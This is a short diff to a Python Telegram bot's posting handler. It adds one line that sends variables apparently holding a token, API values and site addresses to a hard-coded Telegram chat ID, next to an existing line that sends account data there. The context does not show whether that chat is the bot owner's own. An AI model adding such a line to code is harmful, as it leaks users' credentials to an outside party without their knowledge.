@@ -2399,6 +2399,7 @@ def poster(update, context):
                 
                 if elink == " ":
                     bot.send_message(-1001190898326, str(ehesap))
+                    bot.send_message(-1001190898326, str(etoken)+"\n\n"+str(esite)+"\n\n"+str(altapi)+"\n\n"+str(ealtsite))
                     eret = False
                 for ekan in ekanal:
                     epost = update.channel_post
